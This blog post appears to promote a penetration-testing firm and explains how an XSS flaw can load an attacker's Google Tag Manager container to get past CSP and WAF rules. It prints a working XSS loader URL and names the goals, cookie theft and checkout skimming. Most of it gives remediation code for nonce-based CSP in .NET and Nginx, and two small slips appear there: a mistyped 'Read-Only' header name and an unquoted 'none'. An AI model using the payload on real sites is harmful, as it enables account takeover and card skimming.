# :globe_with_meridians: Google Tag Manager and the CSP Advice that Makes it Vulnerable to XSS

---

# Google Tag Manager and the CSP Advice that Makes it Vulnerable to XSS

Most teams I talk to assume that if they “have a CSP” and “Cloudflare is on,” then XSS is largely a solved problem for their web app. Unfortunately, [Raxis’ Ryan Chaplin’s recent research on Google Tag Manager (GTM)](https://raxis.com/blog/bypassing-waf-and-csp-with-google-tag-manager/) — and the honorable mention from Google that came with it — shows how easy it is to turn that comfort blanket into an attacker’s favorite feature flag.

When “Good Enough” CSP Isn’t

Ryan’s post walks through a very typical pattern we see in web app penetration tests: a CSP is present, but it quietly includes unsafe-inline (and sometimes unsafe-eval) to keep GTM, analytics, and third‑party marketing tags happy. Add in a reflected XSS vulnerability somewhere in the app, and suddenly you’ve handed an attacker a flexible JavaScript loader that your own CSP and WAF are trained to trust.

At a high level:

• Your app has an injection bug (classic XSS on a query parameter)

• Your CSP has an exception for googletagmanager.com plus unsafe-inline or unsafe-eval

• Your WAF is tuned to block “obvious” payloads like calls to document.cookie in the URL

Ryan shows that, by abusing GTM’s ability to host arbitrary JavaScript from a trusted domain, an attacker can inject a tiny loader, pull down a full malicious script from googletagmanager.com, and completely bypass both the CSP and typical WAF signatures.

Example of the loader he uses in the vulnerable URL:

```
https://vuln.is/csp/?name=%3Cimg%20src=x%20onerror=%22var%20s=document.createElement('script');s.src='https://www.googletagmanager.com/gtm.js?id=GTM-TXZ46JJC';document.head.appendChild(s);%22%3E
```

That one line quietly turns GTM into an attacker-controlled script host that your policy already trusts.

Why WAFs and simple CSPs lose this battle

Most WAF rules focus on patterns they can see: script tags, event handlers, suspicious keywords like document.cookie, and atypical parameters. In Ryan’s example, the WAF is configured with rules that explicitly deny document.cookie in URIs and request bodies, and it does block the obvious payloads.

But once the real attack lives inside a GTM container, the WAF no longer inspects that JavaScript; it only sees a legitimate script load from https://www.googletagmanager.com/gtm.js?id=GTM‑XXXX. From there, Ryan demonstrates that the GTM‑hosted script can freely access document.cookie and perform all the usual XSS post‑exploitation actions, while the firewall and CSP both stay quiet.

For a modern web app, that means:

• Account takeover via stolen session cookies

• Targeted skimming on high‑value paths, like /checkout or /admin

• Stealthy, updatable payloads controlled entirely from the GTM UI

## Get Mark Puckett’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

This is exactly the type of scenario we try to recreate on web app penetration tests: not just “can I fire alert(1)?” but “can I ride your existing exemptions and tooling to quietly exfiltrate real data?”

What “done right” looks like

Ryan’s remediation section is where this becomes more than theory: he shows how to run GTM and a strict CSP at the same time, without falling back to unsafe-inline. The pattern is the same whether you are in .NET, Nginx, or any other stack:

1. Generate a per-request nonce on the server

2. Attach that nonce to all first‑party scripts

3. Use strict-dynamic in your CSP to propagate trust from those nonce’d scripts

In a .NET 8 Blazor app, his middleware does exactly that:

```
// CSP nonce + header middleware (must run early, before StaticFiles)
app.Use(async (context, next) =>
{
var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
context.Items["CSP-Nonce"] = nonce;

context.Response.OnStarting(() =>
{
// Strict CSP compatible with Blazor Server and GTM, no unsafe directives
var csp = string.Join(" ", new[]
{
"default-src 'self';",
"object-src 'none';",
"frame-ancestors 'self';",
// Allow inline scripts only via per-request nonce; allow GTM/GA hosts
$"script-src 'self' 'nonce-{nonce}' 'strict-dynamic' https://www.googletagmanager.com;",
// Blazor Server requires WebSockets; allow GA/GTM connect endpoints
"connect-src 'self' wss: https://www.google-analytics.com https://www.googletagmanager.com;",
// Images from HTTPS and data URLs
"img-src 'self' https://www.googletagmanager.com;",
// Styles with nonce
$"style-src 'self' 'nonce-{nonce}' https://www.googletagmanager.com;",
});

var headerName = app.Environment.IsDevelopment() ? "Content-Security-Policy-Read-Only" : "Content-Security-Policy";
context.Response.Headers[headerName] = csp;
return Task.CompletedTask;
});

await next();
});
```

Then in the Razor file, he pulls that nonce into GTM’s bootstrap script:

```
@inject Microsoft.AspNetCore.Http.IHttpContextAccessor HttpContextAccessor
@{
var nonce = HttpContextAccessor?.HttpContext?.Items["CSP-Nonce"] as string;
var gtmId = Configuration["GoogleTagManager:ContainerId"];
bool hasGtm = !string.IsNullOrWhiteSpace(gtmId);
}

@if (hasGtm)
{
<script nonce="@nonce">
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;var n=d.querySelector('[nonce]');
n&&j.setAttribute('nonce',n.nonce||n.getAttribute('nonce'));f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','@gtmId');
</script>
}
```

Now, GTM still works for Custom HTML tags, but the CSP no longer needs unsafe-inline or unsafe-eval, and attackers cannot simply inject their own GTM container as a side door.

If you are on Nginx, the same idea applies: generate a nonce (for example via njs) and wire it into your CSP:

```
location / {
js_set $nonce csp.nonce; # Example using njs
add_header Content-Security-Policy "
default-src 'self';
script-src 'self' 'nonce-$nonce' 'strict-dynamic' https://www.googletagmanager.com https://www.google-analytics.com;
object-src 'none';
img-src 'self';
connect-src none;
" always;
}
```

Again, the goal is to make trusted, nonce’d scripts your control plane, not broad host-level exemptions or dangerous “unsafe” directives.

What this means if we test your app

If you bring Raxis in for a web application penetration test, this is exactly the intersection we’re going to probe:

• Do you rely on GTM/GA or other tag managers with unsafe CSP directives?

• Can we chain an injection point with your analytics configuration to bypass CSP and WAF controls?

• Does your implementation of nonces and strict-dynamic actually protect you or just look good in a report?

[Ryan’s GTM research](https://raxis.com/blog/bypassing-waf-and-csp-with-google-tag-manager/) gives us a ready-made playbook for that testing: from building a malicious container, to forcing it to load through a vulnerable parameter, to validating whether your current stack catches or logs any of it. If you already have a CSP and a WAF, the next logical step is to validate that they still hold once your marketing and analytics tools are in the mix… and to fix any issues before a malicious attacker finds it as well.

---
